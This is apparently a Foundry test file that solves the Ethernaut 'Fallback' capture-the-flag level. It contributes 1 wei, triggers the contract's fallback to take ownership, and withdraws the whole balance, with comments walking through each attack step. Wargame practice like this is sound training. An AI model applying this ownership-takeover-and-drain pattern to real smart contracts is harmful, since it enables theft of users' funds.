// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract FallbackTest -vvvv
contract FallbackTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testFallbackHack() public {
        /****************
         * Factory setup *
         *************** */
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
        /*
         * The goal of this level are :
         * 1- claim ownership
         * 2- reduce the balance to 0
         *
         * Walkthrough :
         * 1) Contribute 1 wei - verify contract state has been updated
         * NB:  a contribution < 0.0001 ETH is needed
         * 2) Call contract with minimum value to trigger fallback
         * 3) Verify contract owner has changed to our address
         * 4) Withdraw from contract - Check contract balance before and after
         */

        // -- 1 --
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(player), 1 wei);

        // -- 2 --
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // -- 3 --
        assertEq(ethernautFallback.owner(), player);
        //-- 4 --
        ethernautFallback.withdraw();

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
